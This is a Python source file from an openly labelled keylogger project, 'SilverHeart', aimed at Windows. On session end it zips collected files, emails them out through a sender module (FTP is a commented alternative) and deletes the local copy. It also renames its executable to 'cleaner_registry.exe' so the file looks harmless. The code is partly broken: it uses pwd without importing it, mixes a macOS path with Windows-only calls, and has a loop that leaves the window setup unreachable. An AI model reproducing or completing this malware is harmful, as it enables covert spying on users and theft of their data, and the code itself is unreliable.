""" A software fully developed in Python 3.7, SilverHeart is a keylogger concept, that can be deployed in Windows. (Mac OS and Linux distributions support will be added soon).
    Copyright (C) 2020 Pedro Vieira

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>. 
"""

# ------------------------------------------------------------------------------------------
#   Fundamental Changes must me made for the proper function of this code
#   The code bellow is the legacy code for Windows with slight changes
# ------------------------------------------------------------------------------------------

import os
import shutil
import time
from winreg import *

import win32con

import win32api
import win32gui


Directory = '/Users/' + pwd.getpwuid( os.getuid() ).pw_name + '/Library'

# Reads the messages from the message map and prints
def wndproc(hwnd, msg, wparam, lparam):
    ctrl = msg
    # Sends email on End of Session
    if ctrl == 17:
        shutil.make_archive(Directory + '/Am0ASk2',
                            'zip', Directory, 'Am0ASk2')

        import sender
        sender.byEmail()          # Invite files via email
        # sender.byFTP()          # Invite files via FTP
      
        shutil.rmtree(Directory)
    else:
        pass


def keeper():
    import replicator
    # renames I_Love_You.exe to a more convincing name
    fakeName = Directory + 'cleaner_registry.exe'
    dir = Directory + 'I_Love_You.exe'
    try:
        os.renames(dir, fakeName)
    except FileNotFoundError:
        pass

    # ---------------------------------- #

    #   Test class
    #   Used to create and test how to grab windows messages
    #   Test "virtually posted" and "real queue" messages
    #   https://devblogs.microsoft.com/oldnewthing/?p=33453

    # ----------------------------------- #

    # Creates invisible console that detects commands

    while True:
        print("Active")
        time.sleep(10)
    hinst = win32api.GetModuleHandle(None)
    wndclass = win32gui.WNDCLASS()
    wndclass.hInstance = hinst
    wndclass.lpszClassName = "CtrlMessage"
    messageMap = {win32con.WM_QUERYENDSESSION: wndproc,  # 17
                  win32con.WM_ENDSESSION: wndproc,  # 22
                  win32con.WM_QUIT: wndproc,  # 18
                  win32con.WM_DESTROY: wndproc,  # 2
                  win32con.WM_CLOSE: wndproc}  # 16

    wndclass.lpfnWndProc = messageMap

    myWindow = win32gui.RegisterClass(wndclass)
    hwnd = win32gui.CreateWindowEx(win32con.WS_EX_LEFT,
                                   myWindow,
                                   "CtrlMessage",
                                   0,
                                   0,
                                   0,
                                   win32con.CW_USEDEFAULT,
                                   win32con.CW_USEDEFAULT,
                                   0,
                                   0,
                                   hinst,
                                   None)

    while True:
        win32gui.PumpWaitingMessages()
        time.sleep(1)
